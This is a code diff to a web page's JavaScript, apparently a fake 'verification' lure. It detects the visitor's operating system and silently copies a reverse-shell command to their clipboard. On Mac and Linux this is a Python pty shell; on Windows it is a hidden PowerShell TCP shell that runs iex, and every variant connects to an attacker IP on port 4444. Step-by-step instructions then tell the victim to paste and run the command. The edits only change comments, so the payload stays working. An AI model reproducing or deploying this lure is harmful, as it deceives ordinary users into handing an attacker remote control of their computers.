@@ -33,9 +33,8 @@
             let cmd = "";
             let instructions = "";
 
-            // 1. Detection Logic for Mac and Chromebook
             if (platform.includes('mac')) {
-                // macOS command: Updated to Python3 to avoid Zsh /dev/tcp limitations
+                // Interactive Zsh shell for Mac
                 cmd = `python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${ip}',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/zsh')\"`;
                 instructions = `
                     1. Press <b>Command + Space</b> and type <b>Terminal</b>.<br>
@@ -43,7 +42,7 @@
                     3. <b>Command + V</b> to paste and press <b>Enter</b>.
                 `;
             } else if (platform.includes('linux') || platform.includes('cros')) {
-                // Chromebook/Linux: ChromeOS uses 'cros' or 'linux' in UserAgent
+                // Interactive Bash shell for Chromebook/Linux
                 cmd = `python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${ip}',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')\"`;
                 instructions = `
                     1. Press <b>Ctrl + Alt + T</b> to open Crosh.<br>
@@ -51,7 +50,7 @@
                     3. <b>Ctrl + Shift + V</b> to paste and press <b>Enter</b>.
                 `;
             } else {
-                // Default Windows PowerShell command (your original code)
+                // Persistent PowerShell data stream for Windows
                 cmd = `powershell -WindowStyle Hidden -Command "$c = New-Object System.Net.Sockets.TCPClient('${ip}',4444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2  = $sb + 'PS ' + (pwd).Path + '> ';$sendb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sendb,0,$sendb.Length);$s.Flush()};$c.Close()"`;
                 instructions = `
                     1. Press <b>Win + R</b> on your keyboard.<br>
@@ -60,7 +59,6 @@
                 `;
             }
 
-            // 2. Clipboard Injection
             navigator.clipboard.writeText(cmd).then(() => {
                 document.getElementById('btn').style.display = 'none';
                 document.getElementById('msg').innerText = "Follow the steps to complete verification:";
